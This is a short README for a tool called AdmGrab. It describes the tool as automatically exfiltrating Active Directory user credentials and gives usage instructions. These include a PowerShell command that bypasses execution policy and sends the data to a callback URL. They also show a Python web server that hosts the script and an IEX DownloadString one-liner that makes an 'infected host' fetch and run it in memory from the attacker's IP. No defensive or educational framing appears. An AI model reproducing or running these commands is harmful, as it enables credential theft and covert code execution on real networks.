# AdmGrab
Automatically exfiltrate AD user credentials.

## Local Execution
For execution from file, use
`powershell.exe -ExecutionPolicy ByPass -File AdmGrab.ps1 -aesKey=KEY -callbackUrl=URL`

## Remote Execution
To enforce execution in memory start a python webserver in the folder the AdmGrab.ps1 is located
```
pyton -m SimpleHTTPServer 8080
```

Suppose you are on IP 10.0.0.1, now force the infected host to run the following command
```
powershell.exe "IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.1:8080/AdmGrab.ps1')"
```
